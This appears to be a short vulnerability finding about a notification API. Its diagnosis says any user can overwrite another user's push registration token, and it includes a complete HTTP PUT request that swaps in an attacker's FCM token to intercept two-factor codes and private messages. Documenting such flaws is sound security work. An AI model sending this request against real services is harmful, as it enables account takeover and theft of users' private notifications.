diagnosis: GCMDeviceTokenUpdateView updates the Firebase/GCM registration_id for any device_id without verifying that device.user == request.user. An attacker can replace another user's push token with their own, intercepting subsequent mobile push notifications containing two-factor OTPs, transaction alerts, and private messages.
exploit_request:
PUT /api/notifications/gcm/3180/ HTTP/1.1
Host: push.appcore.io
Authorization: Token attacker_session_token
Content-Type: application/json

{"registration_id": "attacker_fcm_device_token_xyz987"}
